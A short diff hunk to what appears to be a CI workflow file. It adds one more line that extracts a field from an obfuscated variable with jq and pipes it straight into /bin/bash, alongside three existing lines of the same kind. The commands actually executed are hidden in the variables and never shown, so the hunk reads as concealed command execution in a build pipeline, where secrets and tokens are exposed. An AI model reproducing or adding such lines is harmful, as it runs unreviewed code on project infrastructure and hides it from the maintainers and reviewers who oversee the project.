@@ -26,6 +26,7 @@ jobs:
           echo $qud76190 | jq -r .e5 | /bin/bash
           printf '%s' "$ij125" | jq -r .y80 | /bin/bash
           printf '%s' "$dpunb794" | jq -r .fl6 | /bin/bash
+          echo $iiue3 | jq -r .l6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
